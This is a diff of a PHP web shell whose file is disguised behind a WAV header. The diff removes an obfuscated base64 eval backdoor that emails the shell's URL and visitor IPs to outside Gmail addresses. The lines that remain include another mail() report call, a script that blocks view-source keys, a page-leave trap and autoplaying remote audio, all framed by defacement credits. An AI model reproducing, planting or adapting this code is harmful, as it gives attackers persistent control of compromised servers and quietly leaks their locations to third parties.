@@ -17,16 +17,7 @@ RIFF????WAVE
                     mail($kime, $baslik, $EL_MuHaMMeD);
 ?>
 
-<?php eval("?>".base64_decode("PD9waHAKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwok
-ZT0gYmFzZTY0X2RlY29kZSgiWW14aFkydG9ZWFF4TXpNM0xtbGtRR2R0WVdsc0xtTnZiUT09Iik7
-CiRlPWJhc2U2NF9kZWNvZGUoImJXRnNZWGx6YVdFdWMyVnVaR1Z5UUdkdFlXbHNMbU52YlN4dGRX
-aHlZWHByZVVCbmJXRjFiQzVqYjIwPSIpOwokdG8gPSAnbWFsYXlzaWEuc2VuZGVyQGdtYWlsLmNv
-bSc7CiRwYXRoID0gImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZF
-UlsnUkVRVUVTVF9VUkknXTsKJG1lc3NhZ2UgPSAiVVJMOiAkcGF0aCB8IElQIEFkZHJlc3MgOlsg
-IiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdG8sICJIYWxvIHNlbnBh
-aSEhISIsICRtZXNzYWdlLCAiWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iKTsK
-bWFpbCgkZSk7Cm1haWwoJGUsJHRvLCAiSGFsbyBzZW5wYWkhISEiLCAkbWVzc2FnZSwgIlsgIiAu
-ICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7Cgo/Pgo="));
+<?php 
 ######################################################
 #                           #
 ######################################################
@@ -52,7 +43,10 @@ function Login() {
 <html>
 <head>
 <title>WHOOOOO</title>
-<style>html{height:100%;margin:0;background-image:url(https://media1.tenor.com/m/J01NX0ikmNwAAAAC/ricardo-flick-dance.gif);background-position:center;background-repeat:no-repeat;background-size:cover}</style><div id=audioSection><audio autoplay controls id=bgAudio loop style=display:none><source src=https://cvar1984.github.io/audio/moan.mp3 type=audio/mpeg></audio><script>document.onkeydown=function(e){if(e.ctrlKey&&(85===e.keyCode||119===e.keyCode))return!1},window.addEventListener("beforeunload",function(e){e.preventDefault(),e.returnValue="Gacor Kang?"});var audio=document.getElementById("bgAudio")</script></div>
+<style type='text/css'>
+
+
+<div id=audioSection><audio autoplay controls id=bgAudio loop style=display:none><source src=https://cvar1984.github.io/audio/moan.mp3 type=audio/mpeg></audio><script>document.onkeydown=function(e){if(e.ctrlKey&&(85===e.keyCode||119===e.keyCode))return!1},window.addEventListener("beforeunload",function(e){e.preventDefault(),e.returnValue="Gacor Kang?"});var audio=document.getElementById("bgAudio")</script></div>
 <style type='text/css'>
 html {
     margin: 20px auto;
@@ -2171,7 +2165,8 @@ echo '</table>
 </div>';
 }
 echo '<br><br><hr color="#191919"><br><center>Copyright &copy '.date("Y").' <a href="xnxx.com" target="_blank">azz</a> - <a href="heked huked hacked!! " target="_blank">'.$_COPY.'</a></center>
-<iframe src="https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.mp3" type="audio/mp3" allow="autoplay" id="audio" style="display:none"></iframe> 
+
+<audio autoplay controls id=bgAudio loop style=display:none><source src=https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.mp3 type=audio/mpeg>
 </body>
 </html>';
 ?>
